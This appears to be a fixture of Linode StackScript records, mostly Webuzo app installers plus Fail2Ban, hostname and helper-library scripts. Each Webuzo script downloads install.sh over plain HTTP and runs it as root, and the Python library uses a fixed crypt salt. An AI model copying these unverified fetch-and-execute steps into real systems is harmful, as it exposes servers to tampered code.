      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Vty powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Vty and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Vty :\n#   Vty is
      a web-based database manager script written with Php. It''s for Mysql.\n#   You
      can connect to Mysql and see and edit your databases and tables. \n###########################################################################################################\n\n#
      Install Vty Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=327&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Vty and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Vty has been successfully installed\"\necho \" \"\necho \"You
      can now configure Vty and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 575759, "username":
      "jfeinbaum", "user_gravatar_id": "b5810c3cbafb05a4d8a19e3a11e37ab3", "label":
      "dingdong", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/alpine3.10"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "", "script": "#!/bin/bash\n# This block defines the variables the user of the
      script needs to input\n# when deploying using this script.\n#\n#\n#<UDF name=\"hostname\"
      label=\"The hostname for the new Linode.\">\n# HOSTNAME=\n#\n#<UDF name=\"fqdn\"
      label=\"The new Linode''s Fully Qualified Domain Name\">\n# FQDN=\n\n# This
      sets the variable $IPADDR to the IP address the new Linode receives.\nIPADDR=$(/sbin/ifconfig
      eth0 | awk ''/inet / { print $2 }'' | sed ''s/addr://'')\n\n# This updates the
      packages on the system from the distribution repositories.\napt-get update\napt-get
      upgrade -y\n\n# This section sets the hostname.\necho $HOSTNAME > /etc/hostname\nhostname
      -F /etc/hostname\n\n# This section sets the Fully Qualified Domain Name (FQDN)
      in the hosts file.\necho $IPADDR $FQDN $HOSTNAME >> /etc/hosts", "user_defined_fields":
      [{"name": "hostname", "label": "The hostname for the new Linode."}, {"name":
      "fqdn", "label": "The new Linode''s Fully Qualified Domain Name"}]}, {"id":
      712720, "username": "aleksd2000", "user_gravatar_id": "a22bad2fb913c1cd5d89fab0d03de7ee",
      "label": "Fail2Ban Server", "description": "Fail2Ban Server Setup\n\nFail2Ban
      is an intrusion prevention software framework that protects computer servers
      from brute-force attacks. Written in the Python programming language, it is
      able to run on POSIX systems that have an interface to a packet-control system
      or firewall installed locally, for example, iptables or TCP Wrapper\n\nThis
      script installs the Fail2Ban application and creates two \"Jails\" one for SSH,
      and the other for SSHD.\n\nI hope people find this useful.", "ordinal": 0, "logo_url":
      "", "images": ["linode/debian8", "linode/debian9", "linode/debian10"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "Added support for Debian 8 and
      9, and added default jail.local file", "script": "#!/bin/bash\n\n# Updating
      APT Database\napt-get update\n# Taking care of an initial upgrade\napt-get -y
      upgrade\n\n# Installing Fail2Ban Server\napt-get -y install fail2ban\n\n# Creating
      initial Jail.local File\ncat <<EOF > /etc/fail2ban/jail.local\n\n# Default banning
      action (e.g. iptables, iptables-new,\n# iptables-multiport, shorewall, etc)
      It is used to define\n# action_* variables. Can be overridden globally or per\n#
      section within jail.local file\n\n#banaction = ufw\n#banaction_allports = ufw\n\n[ssh]\n\nenabled  =
      true\nport     = ssh\nfilter   = sshd\nlogpath  = /var/log/auth.log\nmaxretry
      = 1\nfindtime = 1d\nbantime  = 1y\n\n[sshd]\nenabled = true\nmaxretry = 1\nfindtime
      = 1d\nbantime  = 1y\n\nEOF\n\nsystemctl reload fail2ban", "user_defined_fields":
      []}, {"id": 9233, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Plandora powered by Webuzo", "description": "Plandora project was
      born to be a tool to help the software development process, from the customer
      requirement until the task conclusion, and consequently gather the \"history\"
      of project.\r\nThe Plandora system can be useful for teams that have problems
      with resource bottle-necks, parallel projects, critical dead lines, necessity
      for scope documentation of tasks and requirements, etc. \r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Plandora and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Plandora powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Plandora and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Plandora :\n#   Plandora
      project was born to be a tool to help the software development process, from
      the customer \n#   requirement until the task conclusion, and consequently gather
      the \"history\" of project.\n###########################################################################################################\n\n#
      Install Plandora Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=424&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Plandora and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Plandora has been successfully installed\"\necho \" \"\necho
      \"You can now configure Plandora and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9234, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "ClientExec
      powered by Webuzo", "description": "ClientExec offers online help desk software
      intended to enhance the ability of small and mid-sized hosting businesses to
      manage help and support issues. Because the online help desk software can be
      accessed from any web browser, managers and staff can increase the flexibility
      and effectiveness with which they address client support issues.\r\n\r\nClientExec''s
      software includes an easy-to-use interface that enhances communication between
      clients and staff. E-mail messages sent through the online help desk software
      are automatically routed and tracked, so you don''t have to spend time chasing
      after lost messages. Support tickets can be quickly sorted, filtered, and assigned
      to individual team members, ensuring that the tickets are addressed in the most
      efficient possible manner.\r\n\t\t\t\r\nWebuzo is a Single User Control Panel
      which helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System
      Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in
      the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure ClientExec
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "ClientExec powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install ClientExec and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About ClientExec :\n#   ClientExec
      offers online help desk software intended to enhance the ability of small and
      mid-sized \n#   hosting businesses to manage help and support issues.\n#   Because
      the online help desk software can be accessed from any web browser, managers
      and \n#   staff can increase the flexibility and effectiveness with which they
      address client support issues.\n###########################################################################################################\n\n#
      Install ClientExec Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=478&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      ClientExec and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, ClientExec has been successfully installed\"\necho \" \"\necho
      \"You can now configure ClientExec and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 978962, "username":
      "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2", "label":
      "StackScript Label", "description": "Description", "ordinal": 0, "logo_url":
      "", "images": ["linode/alpine3.12", "linode/alpine3.13", "linode/alpine3.15"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Revision Note 1", "script": "#!/bin/bash\n\nScript", "user_defined_fields":
      []}, {"id": 9235, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Croogo powered by Webuzo", "description": "Croogo is a free, open
      source, content management system for PHP. It is powered by CakePHP MVC framework.
      \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users deploy
      Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP,
      Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou can
      get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation
      Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
      installation process, access http://your-ip:2004 to configure Croogo and Softaculous
      Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal": 0,
      "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Croogo powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Croogo and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Croogo :\n#   Croogo
      is a free, open source, content management system for PHP. It is powered by
      CakePHP MVC framework. \n###########################################################################################################\n\n#
      Install Croogo Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=443&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Croogo and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Croogo has been successfully installed\"\necho \" \"\necho
      \"You can now configure Croogo and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 20, "username":
      "nbebout", "user_gravatar_id": "5dd8fb66331617dbbd6f90a10cdd47ac", "label":
      "Fedora/CentOS Bash Library", "description": "", "ordinal": 0, "logo_url": "",
      "images": ["linode/centos5.632bit", "linode/centos5.6", "linode/fedora1132bit"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "", "script": "#!/bin/bash\n\n###########################################################\n#
      System\n###########################################################\n\nfunction
      system_update {\n  yum -y update\n}\n\nfunction system_primary_ip {\n  # returns
      the primary IP assigned to eth0\n  echo $(ifconfig eth0 | awk -F: ''/inet addr:/
      {print $2}'' | awk ''{ print $1 }'')\n}\n\nfunction get_rdns {\n  # calls host
      on an IP address and returns its reverse dns\n  if [ ! -e /usr/bin/host ]; then\n   yum
      -y install bind-utils > /dev/null\n  fi\n  echo $(host $1 | awk ''/pointer/
      {print $5}'' | sed ''s/\\.$//'')\n}\n\nfunction get_rdns_primary_ip {\n  # returns
      the reverse dns of the primary IP assigned to this system\n  echo $(get_rdns
      $(system_primary_ip))\n}\n\nfunction install_basics {\n  yum install -y jwhois
      rsync openssh-clients wget\n}", "user_defined_fields": []}, {"id": 9236, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "WideImage
      powered by Webuzo", "description": "WideImage is an object-oriented library
      for image manipulation.\r\n\r\nThe library provides a simple way to loading,
      manipulating and saving images in the most common image formats. \r\n\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      WideImage and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "WideImage powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install WideImage and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About WideImage :\n#   WideImage
      is an object-oriented library for image manipulation.\n#   The library provides
      a simple way to loading, manipulating and saving images in the most common image
      formats.\n###########################################################################################################\n\n#
      Install WideImage Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=360&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      WideImage and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, WideImage has been successfully installed\"\necho \" \"\necho
      \"You can now configure WideImage and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1193748, "username":
      "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd", "label":
      "StackScript Python Library", "description": "Does nothing on its own. Do not
      deploy directly.\r\n\r\nA collection of useful Python functions to be included
      in other StackScripts.", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts",
      "linode/centos7", "linode/debian8", "linode/fedora22"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "Initial import.", "script": "#!/usr/bin/env
      python\n\n\"\"\"\nPython Library StackScript\n\n\tAuthor: Ricardo N Feliciano
      <rfeliciano@linode.com>\n\tVersion: 1.0.0.0\n\tRequirements:\n\t\t- n/a\n\nThis
      StackScript is not meant to be directly deployed. Includes a host of\nfunctions
      to do very common task on a distro, as implemented in Python. The\nfunctions
      in this library are designed to be run accross the Linode Core\nDistributions:\n\t-
      Ubuntu\n\t- CentOS\n\t- Debian\n\t- Fedora\n\"\"\"\n\n\nimport crypt\nimport
      fcntl\nimport logging\nimport os\nimport platform\nimport pwd\nimport socket\nimport
      subprocess\nimport sys\nimport time\ntry:\n\timport apt\nexcept:\n\ttry:\n\t\timport
      yum\n\texcept:\n\t\ttry:\n\t\t\timport dnf\n\t\texcept ImportError:\n\t\t\tprint(\"Package
      manager support was not found.\")\n\t\t\t\n\ndistro = None\n\"\"\"String list:
      Contains details of the distribution.\"\"\"\n\n\ndef end():\n\t\"\"\"End the
      StackScript cleanly.\"\"\"\n\t\n\t# Should the StackScripts themselves be removed
      here at some point?\n\tlogging.info(\"The StackScript has been completed.\")\n\tsubprocess.check_output(''echo
      \"The StackScript has completed. Press enter to continue.\" | wall -n'', shell=True)\n\n\ndef
      init():\n\t\"\"\"Start features we consider StackScript standard.\"\"\"\n\t\n\t#
      Sanity check for CentOS 7 & Fedora 22\n\tif os.path.exists(\"/var/log/stackscript.log\"):\n\t\tsys.exit(1)
      # StackScript already started once, bail\n\t\n\twith open(\"/etc/profile.d/stackscript.sh\",
      \"w\") as f:\n\t\tf.write(\"\"\"#!/bin/bash\nif pgrep -f \"python /root/StackScript\"
      &>/dev/null\nthen\n\techo \"####################################################################\"\n\techo
      \"#####\"\n\techo \"#####  Warning: Your StackScript is still running\"\n\techo
      \"#####\"\n\techo \"#####\"\n\techo \"#####  Please do not make any system changes
      until it \"\n\techo \"#####  completes. Log file is located at: \"\n\techo \"#####    /var/log/stackscript.log\"\n\techo
      \"####################################################################\"\n\techo
      \" \"\nelse\n\techo \"####################################################################\"\n\techo
      \"#####\"\n\techo \"#####  The StackScript has completed. Enjoy your system.\"\n\techo
      \"#####\"\n\techo \"#####\"\n\techo \"#####  For reference, the logfile is located
      at: \"\n\techo \"#####    /var/log/stackscript.log\"\n\techo \"####################################################################\"\n\techo
      \" \"\n\trm /etc/profile.d/stackscript.sh\nfi\"\"\")\n\t\n\tlogging_start()\n\n\ndef
      logging_start(the_file=\"/var/log/stackscript.log\", the_level=logging.INFO):\n\t\"\"\"Turn
      on logging.\"\"\"\n\t\n\tlogging.basicConfig(filename=the_file, level=the_level)\n\tlogging.info(\"Logging
      has started. \" + str(time.time()))\n\n\ndef system_detect_distro():\n\t\"\"\"Prepares
      distro information.\n\t\n\tThis is critical to support the Linode Core Distributions
      with a single\n\tscript.\n\t\"\"\"\n\tglobal distro\n\n\t# add support for logging\n\t\n\tdistro
      = dict(zip((''distname'', ''version'', ''codename''),\n\tplatform.linux_distribution(full_distribution_name=0)))\n\t\n\tdistro[''distname'']
      = distro[''distname''].lower()\n\n\tif distro[''distname''] in (''debian'',
      ''ubuntu''):\n\t\tdistro[''family''] = \"debian\"\n\telif distro[''distname'']
      in (''fedora'', ''centos''):\n\t\tdistro[''family''] = \"redhat\"\n\telse:\n\t\traise
      NotImplementedError(\"This distribution is not supported.\")\n\n\ndef system_IP_get():\n\t\"\"\"Return
      IPv4 address configured on eth0.\n\t\n\tThis basically is a disgusting hack.
      Please let me know if you find a\n\tcleaner way to do this.\"\"\"\n\t# add support
      for logging\n\n\ts = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\treturn
      socket.inet_ntoa(fcntl.ioctl(\n\t\ts.fileno(),\n\t\t0x8915, # SIOCGIFADDR\n\t\tstruct.pack(''256s'',
      \"eth0\")\n\t)[20:24])\n\n\ndef system_IP_rdns(IP):\n\t\"\"\"Get PTR for given
      IP address.\"\"\"\n\t# add support for logging\n\n\treturn socket.gethostbyaddr(IP)[0]\n\n\ndef
      system_package_install(package, update_first=True):\n\t\"\"\"Install a package
      with the appropriate package manager.\"\"\"\n\t# add support for logging\n\n\tif
      distro is None:\n\t\tsystem_detect_distro()\n\n\tsystem_update() if update_first
      else None\n\t\n\tif distro[''family''] == \"debian\":\n\t\tos.environ[''DEBIAN_FRONTEND'']
      = \"noninteractive\"\n\t\tcache = apt.Cache()\n\t\tpkg = cache[package]\n\t\tpkg.mark_install()\n\t\tcache.commit()\n\telif
      distro[''distname''] == \"centos\":\n\t\tyb = yum.YumBase()\n\t\tyb.conf.assumeyes
      = True\n\t\tyb.install(name=package)\n\t\tyb.resolveDeps()\n\t\tyb.processTransaction()\n\t\tyb.close()\n\telif
      distro[''distname''] == \"fedora\":\n\t\tdnfb = dnf.Base()\n\t\tdnfb.conf.assumeyes
      = True\n\t\tdnfb.read_all_repos()\n\t\tdnfb.fill_sack()\n\t\tdnfb.install(package)\n\t\tdnfb.resolve()\n\t\tdnfb.download_packages(dnfb.transaction.install_set)\n\t\tdnfb.do_transaction()\n\t\tdnfb.close()\n\n\ndef
      system_update():\n\t\"\"\"Uses the distro''s package manager to update packages.\"\"\"\n\t#add
      support for logging\n\t\n\tif distro is None:\n\t\tsystem_detect_distro()\n\t\n\tif
      distro[''family''] == \"debian\":\n\t\tcache = apt.Cache()\n\t\tcache.update()\n\t\tcache.open(None)\n\t\tcache.upgrade()\n\t\tcache.commit()\n\telif
      distro[''distname''] == \"centos\":\n\t\tyb = yum.YumBase()\n\t\tyb.conf.assumeyes
      = True\n\t\tyb.update()\n\t\tyb.resolveDeps()\n\t\tyb.processTransaction()\n\t\tyb.close()\n\telif
      distro[''distname''] == \"fedora\":\n\t\tdnfb = dnf.Base()\n\t\tdnfb.conf.assumeyes
      = True\n\t\t#dnfb.read_all_repos() #updates were failing with this line\n\t\tdnfb.fill_sack()\n\t\tdnfb.upgrade_all()\n\t\tdnfb.resolve()\n\t\tdnfb.do_transaction()\n\t\tdnfb.close()\n\n\ndef
      user_add(username, password, groups):\n\t\"\"\"Creates a Linux user account.\n\t\n\tArgs:\n\t\tusername
      (String): A Linux username.\n\t\tpassword (String): Password for the user.\n\t\tgroups
      (tuple): Groups that the user should be added to.\n\t\n\tReturns:\n\t\tbool:
      True if successful, False otherwise.\n\t\"\"\"\n\n\t# need to implement logging\n\t#
      need to implement group functionality\n\n\treturn subprocess.call([''useradd'',
      ''-m'', ''-p'', crypt.crypt(password, \"22\"), ''-s'', ''/bin/bash'', username])\n\n\ndef
      user_add_pubkey(username, key):\n\t\"\"\"Adds the public SSH key to the specified
      user.\"\"\"\n\t# need to implement logging\n\t\n\tif username != \"root\":\n\t\tos.seteuid(pwd.getpwnam(username).pw_uid)\n\t\tos.setegid(pwd.getpwnam(username).pw_gid)\n\t\n\tpubkey_dir
      = os.path.join(os.getenv(\"HOME\"), \".ssh\")\n\t\n\tif not os.path.isdir(pubkey_dir):\n\t\tos.makedirs(pubkey_dir)\n\t\n\twith
      open(os.path.join(pubkey_dir, \"authorized_keys\")) as f:\n\t\tf.write(key)\n\t\n\tif
      username != \"root\":\n\t\tos.seteuid(0)\n\t\tos.setegid(0)", "user_defined_fields":
      []}, {"id": 9237, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "HelpDEZk powered by Webuzo", "description": "HelpDEZk is a powerfull
      software that manages requests/incidents. It has all the needed requirements
      to an efficient workflow management of all processes involved in service execution.
      This control is done for internal demands and also for outsourced services.\r\n\r\nHelpDEZk
      can be used at any company''s area, serving as an support to the shared service
      center concept, beyond the ability to log all the processes and maintain the
      request''s history, it can pass it through many approval levels.\r\n\r\nHelpDEZk
      can put together advanced managing resources with an extremely easy use. Simple
      and intuitive screens make the day-by-day easier for your team, speeding up
      the procedures and saving up a lot of time. It is developped in objects oriented
      PHP language, with the MVC architecture and uses the templates system SMARTY.
      For the javascripts, JQUERY is used. \r\n\t\t\t\r\nWebuzo is a Single User Control
      Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or
      System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines
      or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure HelpDEZk
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
